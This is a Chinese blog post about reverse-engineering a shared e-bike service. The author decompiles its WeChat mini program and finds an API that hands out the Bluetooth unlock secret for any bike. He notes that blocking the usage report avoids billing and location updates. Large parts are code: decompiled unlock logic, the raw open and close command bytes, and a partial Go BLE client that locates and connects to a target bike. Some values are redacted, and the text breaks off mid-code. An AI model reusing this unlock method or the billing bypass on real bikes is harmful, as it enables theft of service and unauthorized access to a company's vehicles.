@@ -1,0 +1,282 @@
+<p>距离上一次三月份写博客，已经过了整整五个月了。</p>
+<p>我在三月底的时候去南京打了一场 CTF 线下赛，顺带旅游了一波。四月份的时候&hellip;&hellip; 我，母胎单身 23 年的我，居然如愿以偿地脱单了。谈恋爱之后感觉每天的时间都过得飞快，各种出去吃吃喝喝逛逛，所以博客一直拖着没写。（当时也没啥东西写</p>
+<p>六月份的时候我在余杭租的公寓到期了，再加上现在是在家远程弹性办公，我便搬到了杭州比较偏的地方住着，这里的房东都是附近的拆迁户，去年年底每个人都分到了好几套安置房，遂拿来出租给附近的学生和上班族，房租那叫一个低。
+低房租的代价就是出门很不方便，最近的地铁站也要两公里。随着小区附近的基础设施逐渐完善，我发现家楼下有共享电单车了，每天晚上饿了可以骑着电单车到离家几公里的海底捞搓一顿。</p>
+<p>不过这共享电单车比较坑，一次起充 20 元，时间久了，我难免有点心痒想试试手，有天晚上悄悄推了一辆车进电梯上楼，然后放家里客厅。开干！</p>
+<p>因为怕惹上不该惹的麻烦，以下内容有部分修改和打码，敬请谅解。</p>
+<h2 id="先从小程序下手">先从小程序下手</h2>
+<p>跟市面上的共享单车一样，解锁一辆共享电单车是通过手机扫描车身上的二维码，拉起微信小程序，然后在小程序内点击开锁。那么我们就先从小程序入手，看看它的开锁流程中是否有不安全的因素。
+微信小程序的反编译解包在 GitHub 上有现成的工具，本文就不再赘述。我后面其实是用了更加取巧的方式轻松地拿到了小程序解包后的代码。基本上是在源码 JavaScript 上打包压缩过的程度，静态看变量跟流程也是十分轻松。</p>
+<p>我们直接在全局代码中搜索<code>开锁</code>二字，很快就找到了其小程序中的“开锁中” Toast 弹窗，弹窗的回调就是调用蓝牙发送开锁的操作：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>(wx.showToast({
+</span></span><span style="display:flex;"><span> title<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">&#34;开锁中&#34;</span>,
+</span></span><span style="display:flex;"><span> icon<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">&#34;loading&#34;</span>,
+</span></span><span style="display:flex;"><span> mask<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#ff7b72;font-weight:bold">!</span><span style="color:#a5d6ff">0</span>,
+</span></span><span style="display:flex;"><span> duration<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">1e5</span>
+</span></span><span style="display:flex;"><span> }), e.checkToken(<span style="color:#ff7b72">function</span>(o) {
+</span></span><span style="display:flex;"><span> o.length <span style="color:#ff7b72;font-weight:bold">&gt;</span> <span style="color:#a5d6ff">0</span> <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> e.operateBluetooth(<span style="color:#a5d6ff">&#34;open&#34;</span>, e.globalData.machineNO, <span style="color:#ff7b72">function</span>(n) {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> (n) {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> a <span style="color:#ff7b72;font-weight:bold">=</span> e.globalData.baseUrl <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">&#34;park/continueRide.do&#34;</span>, l <span style="color:#ff7b72;font-weight:bold">=</span> {
+</span></span><span style="display:flex;"><span> token<span style="color:#ff7b72;font-weight:bold">:</span> o,
+</span></span><span style="display:flex;"><span> ble<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#ff7b72;font-weight:bold">!</span><span style="color:#a5d6ff">0</span>,
+</span></span><span style="display:flex;"><span> orderSource<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">3</span>
+</span></span><span style="display:flex;"><span> };
+</span></span><span style="display:flex;"><span> t.request(a, l, <span style="color:#ff7b72">function</span>(o) {
+</span></span><span style="display:flex;"><span> o.ret <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> (wx.hideToast(), e.unlockAudio(), i <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> i());
+</span></span><span style="display:flex;"><span> });
+</span></span><span style="display:flex;"><span> } <span style="color:#ff7b72">else</span> t.showModal_nocancel(<span style="color:#a5d6ff">&#34;蓝牙操作失败，请重试！&#34;</span>);
+</span></span><span style="display:flex;"><span> });
+</span></span><span style="display:flex;"><span> }))
+</span></span></code></pre></div><p>发现重点是 <code>operateBluetooth</code> 函数，这个函数传入了三个入参，分别是 <code>open</code> 字符串、<code>e.globalData.machineNO</code> 也就是车辆编号，分析过后发现就是车辆二维码下面的数字，第三个参数是一个函数，看函数里面调用了 <code>park/continueRide.do</code> 接口，应该是向服务端上报车辆的开锁状态。这个函数应该就是个回调函数。</p>
+<p>由这里我们其实也可以知道，车辆在开锁后是手机上的小程序上报开锁状态的，因为共享电单车本身是无法联网的，它的一切开锁关锁定位状态都需要用户的手机上报。如果我们在手机上 block 掉了这个发送给服务端的请求，就可以实现蓝牙开锁后不计费、车辆搬走后不更新定位等功能。</p>
+<p>但秉着对技术的追求，我还是想继续深挖这个蓝牙通信的过程。往下跟 <code>operateBluetooth</code> 函数：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>operateBluetooth<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#ff7b72">function</span>(o, t, e) {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> a <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">this</span>;
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">this</span>.getSecretKey(t).then(<span style="color:#ff7b72">function</span>(n) {
+</span></span><span style="display:flex;"><span> a.bluetooth.start(o, n.machineNO, n.secret, <span style="color:#ff7b72">function</span>(o) {
+</span></span><span style="display:flex;"><span> a.saveLog(t, a.globalData.mobileBrand, a.globalData.mobileOS, JSON.stringify(a.bluetooth.getLog())),
+</span></span><span style="display:flex;"><span> console.log(a.bluetooth.getMachinevoltage()), e <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> e(o);
+</span></span><span style="display:flex;"><span> });
+</span></span><span style="display:flex;"><span> });
+</span></span><span style="display:flex;"><span> }
+</span></span></code></pre></div><p>这里我们遇到了第一个“纸老虎”，有个 <code>getSecretKey</code> 函数，它的函数入参 <code>o</code>，就是上面 <code>operateBluetooth</code> 的第二个参数 <code>t</code>，也就是车辆的编号。这个函数在请求服务端获取当前车辆的秘钥！
+抱着试一试的想法，我构造了下请求，第一个 <code>token</code> 参数是小程序抓包得到的当前用户登录后获得的 Token，<code>userCode</code> 传入电单车编号&hellip;&hellip; 结果居然真的成功给我返回车辆的秘钥。
+我又用车辆定位的接口获取了其它的车辆编号传入这个接口，居然也能返回给我对应车辆的秘钥。也就是它后端完全没有校验该车是否为被我租借的状态，我可以请求接口拿任意车的秘钥开锁。
+可见它该防的没防住，所以我才称之为“纸老虎”。</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>getSecretKey<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#ff7b72">function</span>(o) {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> e <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">this</span>;
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">return</span> <span style="color:#ff7b72">new</span> Promise(<span style="color:#ff7b72">function</span>(a, n) {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> l <span style="color:#ff7b72;font-weight:bold">=</span> e.globalData.baseUrl <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">&#34;/machine/getBleSecret.do&#34;</span>;
+</span></span><span style="display:flex;"><span> e.checkToken(<span style="color:#ff7b72">function</span>(e) {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> (e.length <span style="color:#ff7b72;font-weight:bold">&gt;</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> n <span style="color:#ff7b72;font-weight:bold">=</span> {
+</span></span><span style="display:flex;"><span> token<span style="color:#ff7b72;font-weight:bold">:</span> e,
+</span></span><span style="display:flex;"><span> userCode<span style="color:#ff7b72;font-weight:bold">:</span> o
+</span></span><span style="display:flex;"><span> };
+</span></span><span style="display:flex;"><span> t.request(l, n, <span style="color:#ff7b72">function</span>(o) {
+</span></span><span style="display:flex;"><span> console.log(<span style="color:#a5d6ff">&#34;获取的秘钥&#34;</span>, o.data), a(o.data);
+</span></span><span style="display:flex;"><span> });
+</span></span><span style="display:flex;"><span> } <span style="color:#ff7b72">else</span> wx.hideToast();
+</span></span><span style="display:flex;"><span> });
+</span></span><span style="display:flex;"><span> });
+</span></span><span style="display:flex;"><span> },
+</span></span></code></pre></div><h2 id="又是-ble">又是 BLE</h2>
+<p>拿到了车辆的秘钥，剩下的就好办了。我们继续跟 <code>a.bluetooth.start</code> 函数：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff7b72">this</span>.start <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">function</span>(e, n, c, l) {
+</span></span><span style="display:flex;"><span> A(), i <span style="color:#ff7b72;font-weight:bold">=</span> e, M <span style="color:#ff7b72;font-weight:bold">=</span> c, C <span style="color:#ff7b72;font-weight:bold">=</span> l, t.log(n, o, <span style="color:#a5d6ff">&#34;operate:&#34;</span>, i), W(<span style="color:#ff7b72">function</span>() {
+</span></span><span style="display:flex;"><span> n <span style="color:#ff7b72;font-weight:bold">==</span> o <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> r <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> i <span style="color:#ff7b72;font-weight:bold">?</span> R() <span style="color:#ff7b72;font-weight:bold">:</span> (o <span style="color:#ff7b72;font-weight:bold">=</span> n, r <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">null</span>, O());
+</span></span><span style="display:flex;"><span> });
+</span></span></code></pre></div><p>其中 e = &ldquo;open&rdquo; 字符串，n = 车辆编号，c = 上面拿到的车辆秘钥，l 又是个执行成功后的回调函数。<code>W</code> 函数调用微信小程序 SDK 中的 <code>wx.openBluetoothAdapter</code> 方法初始化蓝牙，之后的三元运算符进入 <code>O</code> 函数，<code>O</code> 调用 <code>F</code> 函数，<code>F</code> 函数开始搜索蓝牙设备。
+我一看，好家伙，这不是跟我前年搞得小米手环获取心跳的文章一样嘛（<a href="https://github.red/miband-heart-rate/" title="https://github.red/miband-heart-rate/">https://github.red/miband-heart-rate/</a>），这共享电单车也是使用的蓝牙 BLE 协议。
+直接上 Go 的 <code>github.com/JuulLabs-OSS/ble</code> 库，按如下步骤一把梭。</p>
+<ol>
+<li>搜索设备</li>
+<li>搜索 Services</li>
+<li>搜索 Characteristics</li>
+<li>订阅，读写消息</li>
+</ol>
+<h3 id="搜索设备">搜索设备</h3>
+<p>我首先使用 Bluetility 搜索附近的设备，发现没有设备名类似共享电单车的设备。看了下小程序源码设备发现这块：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>wx.onBluetoothDeviceFound(<span style="color:#ff7b72">function</span>(n) {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> l <span style="color:#ff7b72;font-weight:bold">=</span> n.devices[<span style="color:#a5d6ff">0</span>];
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> (l <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> l.advertisData <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> <span style="color:#a5d6ff">0</span> <span style="color:#ff7b72;font-weight:bold">!=</span> l.advertisData.byteLength) {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> s <span style="color:#ff7b72;font-weight:bold">=</span> e.encrypt(e.ab2hex(l.advertisData).slice(<span style="color:#a5d6ff">4</span>, <span style="color:#a5d6ff">13</span>));
+</span></span><span style="display:flex;"><span> t.log(<span style="color:#a5d6ff">&#34;搜索到的设备编号：&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> s <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">&#34;，目标：&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> o), s <span style="color:#ff7b72;font-weight:bold">==</span> o <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> (Q(), clearInterval(c), c <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">null</span>,
+</span></span><span style="display:flex;"><span> r <span style="color:#ff7b72;font-weight:bold">=</span> l.deviceId, t.log(<span style="color:#a5d6ff">&#34;deviceId:&#34;</span>, r), <span style="color:#a5d6ff">&#34;open&#34;</span> <span style="color:#ff7b72;font-weight:bold">==</span> i <span style="color:#ff7b72;font-weight:bold">||</span> <span style="color:#a5d6ff">&#34;close&#34;</span> <span style="color:#ff7b72;font-weight:bold">==</span> i <span style="color:#ff7b72;font-weight:bold">?</span> R() <span style="color:#ff7b72;font-weight:bold">:</span> C <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> C(<span style="color:#ff7b72;font-weight:bold">!</span><span style="color:#a5d6ff">0</span>));
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> });
+</span></span></code></pre></div><p>可以看到它将蓝牙设备的 <code>advertisData</code>，运算后与<code>start</code> 函数中设置的 <code>o</code> 变量（车辆编号）进行比较，如果相同则表明这个设备是我们要找的对应编号的共享电单车。
+这个 <code>advertisData</code> 的运算又是 <code>encrypt</code> 又是 <code>ab2hex</code>，我直接全部喂给 GPT-4 让其给我生成对应的 Go 代码，顺便再让他帮忙生成一下 <code>decrypt</code> 和 <code>hex2ab</code> 函数供我反推验证。整个过程十分舒服。</p>
+<h3 id="搜索-services">搜索 Services</h3>
+<p>连上设备后，根据小程序源码，配合使用 Bluetility，我们需要搜索 <code>fef6</code> 这个 Services。</p>
+<h3 id="搜索-characteristics">搜索 Characteristics</h3>
+<p>使用 Bluetility，我们能得出哪个 Characteristics 是只读的，哪个是可写的。我们往可写的里发送数据。</p>
+<h3 id="发送数据">发送数据</h3>
+<p>连接成功后，首先是执行 <code>N</code> 函数，回调 <code>P</code> 函数。<code>N</code> 函数中调了 <code>G</code> 函数，然后调了 <code>H</code> 函数，后面掉用了 <code>j</code> 函数，分包发送数据。这里是第一次连接的时候的握手包。根据 JavaScript 代码构造对应的 Go <code>[]byte</code> 即可。
+握手结束后回调的 <code>P</code> 函数发送开锁命令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>P <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">function</span> o(c) {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> r <span style="color:#ff7b72;font-weight:bold">=</span> e.getSequenceId(u);
+</span></span><span style="display:flex;"><span> u<span style="color:#ff7b72;font-weight:bold">++</span>;
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> l <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span> <span style="color:#a5d6ff">&#34;open&#34;</span> <span style="color:#ff7b72;font-weight:bold">===</span> c <span style="color:#ff7b72;font-weight:bold">?</span> l <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;03 00 02 01 00&#34;</span> <span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">&#34;close&#34;</span> <span style="color:#ff7b72;font-weight:bold">===</span> c <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> (l <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;03 00 01 01 01&#34;</span>);
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> s <span style="color:#ff7b72;font-weight:bold">=</span> e.header(l, <span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">&#34;00&#34;</span>, r) <span style="color:#ff7b72;font-weight:bold">+</span> l.replace(<span style="color:#79c0ff">/\s+/g</span>, <span style="color:#a5d6ff">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span> t.log(<span style="color:#a5d6ff">&#34;发送&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> c <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">&#34;指令&#34;</span>, s), K(s), I <span style="color:#ff7b72;font-weight:bold">=</span> setTimeout(<span style="color:#ff7b72">function</span>() {
+</span></span><span style="display:flex;"><span> <span style="color:#a5d6ff">0</span> <span style="color:#ff7b72;font-weight:bold">==</span> B <span style="color:#ff7b72;font-weight:bold">?</span> (t.log(<span style="color:#a5d6ff">&#34;设备未响应，自动重发&#34;</span>), B<span style="color:#ff7b72;font-weight:bold">++</span>, o(i)) <span style="color:#ff7b72;font-weight:bold">:</span> (t.log(<span style="color:#a5d6ff">&#34;设备未响应&#34;</span>), wx.hideLoading(), n.showModal(<span style="color:#a5d6ff">&#34;设备未响应，是否重新发送指令？&#34;</span>, <span style="color:#ff7b72">function</span>() {
+</span></span><span style="display:flex;"><span> t.log(<span style="color:#a5d6ff">&#34;手动重发ctrl&#34;</span>), wx.showLoading({
+</span></span><span style="display:flex;"><span> title<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">&#34;开锁中&#34;</span>
+</span></span><span style="display:flex;"><span> }), o(i);
+</span></span><span style="display:flex;"><span> }, <span style="color:#ff7b72">function</span>() {
+</span></span><span style="display:flex;"><span> t.end(<span style="color:#ff7b72">function</span>() {
+</span></span><span style="display:flex;"><span> C <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> C(<span style="color:#ff7b72;font-weight:bold">!</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span> });
+</span></span><span style="display:flex;"><span> }));
+</span></span><span style="display:flex;"><span> }, <span style="color:#a5d6ff">5e3</span>);
+</span></span><span style="display:flex;"><span> }
+</span></span></code></pre></div><p>可以看到拼接好的消息体 <code>s</code> 变量传入了 <code>K</code> 函数进行字符串转十六进制，然后分包发送。
+综上所述，最终的 Go 代码如下，相关数据包以及变量内容已经隐去：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">// Copyright 2023 E99p1ant. All rights reserved.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">package</span> main
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> (
+</span></span><span style="display:flex;"><span> <span style="color:#a5d6ff">&#34;context&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a5d6ff">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a5d6ff">&#34;os&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a5d6ff">&#34;strings&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a5d6ff">&#34;time&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#a5d6ff">&#34;github.com/JuulLabs-OSS/ble&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a5d6ff">&#34;github.com/JuulLabs-OSS/ble/darwin&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> r = []<span style="color:#ff7b72">rune</span>{<span style="color:#a5d6ff">53</span>, <span style="color:#a5d6ff">&#39;R&#39;</span>, <span style="color:#a5d6ff">&#39;E&#39;</span>, <span style="color:#a5d6ff">&#39;D&#39;</span>, <span style="color:#a5d6ff">&#39;A&#39;</span>, <span style="color:#a5d6ff">&#39;C&#39;</span>, <span style="color:#a5d6ff">&#39;T&#39;</span>, <span style="color:#a5d6ff">&#39;E&#39;</span>, <span style="color:#a5d6ff">&#39;D&#39;</span>, <span style="color:#a5d6ff">57</span>, <span style="color:#a5d6ff">69</span>, <span style="color:#a5d6ff">56</span>, <span style="color:#a5d6ff">70</span>, <span style="color:#a5d6ff">55</span>, <span style="color:#a5d6ff">52</span>, <span style="color:#a5d6ff">49</span>, <span style="color:#a5d6ff">48</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">func</span> <span style="color:#d2a8ff;font-weight:bold">encrypt</span>(t <span style="color:#ff7b72">string</span>) <span style="color:#ff7b72">string</span> {
+</span></span><span style="display:flex;"><span> t = strings.<span style="color:#d2a8ff;font-weight:bold">ToUpper</span>(t)
+</span></span><span style="display:flex;"><span> e <span style="color:#ff7b72;font-weight:bold">:=</span> len(t)
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> e &gt; <span style="color:#a5d6ff">16</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> buffer strings.Builder
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">for</span> a <span style="color:#ff7b72;font-weight:bold">:=</span> <span style="color:#a5d6ff">0</span>; a &lt; e; a<span style="color:#ff7b72;font-weight:bold">++</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">for</span> o <span style="color:#ff7b72;font-weight:bold">:=</span> <span style="color:#a5d6ff">0</span>; o &lt; <span style="color:#a5d6ff">16</span>; o<span style="color:#ff7b72;font-weight:bold">++</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> rune(t[a]) <span style="color:#ff7b72;font-weight:bold">==</span> r[o] { <span style="color:#8b949e;font-style:italic">// assuming r is defined somewhere as an array</span>
+</span></span><span style="display:flex;"><span> buffer.<span style="color:#d2a8ff;font-weight:bold">WriteRune</span>(rune(<span style="color:#a5d6ff">42</span> <span style="color:#ff7b72;font-weight:bold">+</span> o))
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">return</span> buffer.<span style="color:#d2a8ff;font-weight:bold">String</span>()
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">func</span> <span style="color:#d2a8ff;font-weight:bold">ab2hex</span>(t []<span style="color:#ff7b72">byte</span>) <span style="color:#ff7b72">string</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> hexStr <span style="color:#ff7b72">string</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">for</span> _, b <span style="color:#ff7b72;font-weight:bold">:=</span> <span style="color:#ff7b72">range</span> t {
+</span></span><span style="display:flex;"><span> hexStr <span style="color:#ff7b72;font-weight:bold">+=</span> fmt.<span style="color:#d2a8ff;font-weight:bold">Sprintf</span>(<span style="color:#a5d6ff">&#34;%02x&#34;</span>, b)
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">return</span> hexStr
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">const</span> machineNo = <span style="color:#a5d6ff">&#34;[REDACTED]&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">func</span> <span style="color:#d2a8ff;font-weight:bold">main</span>() {
+</span></span><span style="display:flex;"><span> mode <span style="color:#ff7b72;font-weight:bold">:=</span> os.Args[<span style="color:#a5d6ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> d, err <span style="color:#ff7b72;font-weight:bold">:=</span> darwin.<span style="color:#d2a8ff;font-weight:bold">NewDevice</span>()
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> err <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#79c0ff">nil</span> {
+</span></span><span style="display:flex;"><span> panic(<span style="color:#a5d6ff">&#34;new device&#34;</span>)
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> ble.<span style="color:#d2a8ff;font-weight:bold">SetDefaultDevice</span>(d)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> ctx <span style="color:#ff7b72;font-weight:bold">:=</span> context.<span style="color:#d2a8ff;font-weight:bold">Background</span>()
+</span></span><span style="display:flex;"><span> client, err <span style="color:#ff7b72;font-weight:bold">:=</span> ble.<span style="color:#d2a8ff;font-weight:bold">Connect</span>(ctx, <span style="color:#ff7b72">func</span>(a ble.Advertisement) <span style="color:#ff7b72">bool</span> {
+</span></span><span style="display:flex;"><span> manufacturerData <span style="color:#ff7b72;font-weight:bold">:=</span> a.<span style="color:#d2a8ff;font-weight:bold">ManufacturerData</span>()
+</span></span><span style="display:flex;"><span> hexStr <span style="color:#ff7b72;font-weight:bold">:=</span> <span style="color:#d2a8ff;font-weight:bold">ab2hex</span>(manufacturerData)
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> len(hexStr) &lt; <span style="color:#a5d6ff">13</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">return</span> <span style="color:#79c0ff">false</span>
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> slicedStr <span style="color:#ff7b72;font-weight:bold">:=</span> hexStr[<span style="color:#a5d6ff">4</span>:<span style="color:#a5d6ff">13</span>]
+</span></span><span style="display:flex;"><span> encryptedStr <span style="color:#ff7b72;font-weight:bold">:=</span> <span style="color:#d2a8ff;font-weight:bold">encrypt</span>(slicedStr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> encryptedStr <span style="color:#ff7b72;font-weight:bold">==</span> machineNo {
+</span></span><span style="display:flex;"><span> fmt.<span style="color:#d2a8ff;font-weight:bold">Printf</span>(<span style="color:#a5d6ff">&#34;%s - %s - %s\n&#34;</span>, a.<span style="color:#d2a8ff;font-weight:bold">LocalName</span>(), a.<span style="color:#d2a8ff;font-weight:bold">Addr</span>().<span style="color:#d2a8ff;font-weight:bold">String</span>(), encryptedStr)
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">return</span> <span style="color:#79c0ff">true</span>
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">return</span> <span style="color:#79c0ff">false</span>
+</span></span><span style="display:flex;"><span> })
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> err <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#79c0ff">nil</span> {
+</span></span><span style="display:flex;"><span> panic(err)
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> services, err <span style="color:#ff7b72;font-weight:bold">:=</span> client.<span style="color:#d2a8ff;font-weight:bold">DiscoverServices</span>(<span style="color:#79c0ff">nil</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> err <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#79c0ff">nil</span> {
+</span></span><span style="display:flex;"><span> panic(err)
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> targetService <span style="color:#ff7b72;font-weight:bold">*</span>ble.Service
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">for</span> _, service <span style="color:#ff7b72;font-weight:bold">:=</span> <span style="color:#ff7b72">range</span> services {
+</span></span><span style="display:flex;"><span> service <span style="color:#ff7b72;font-weight:bold">:=</span> service
+</span></span><span style="display:flex;"><span> uuid <span style="color:#ff7b72;font-weight:bold">:=</span> service.UUID.<span style="color:#d2a8ff;font-weight:bold">String</span>()
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> uuid <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">&#34;fef6&#34;</span> {
+</span></span><span style="display:flex;"><span> targetService = service
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> characteristics, err <span style="color:#ff7b72;font-weight:bold">:=</span> client.<span style="color:#d2a8ff;font-weight:bold">DiscoverCharacteristics</span>(<span style="color:#79c0ff">nil</span>, targetService)
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> err <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#79c0ff">nil</span> {
+</span></span><span style="display:flex;"><span> panic(err)
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
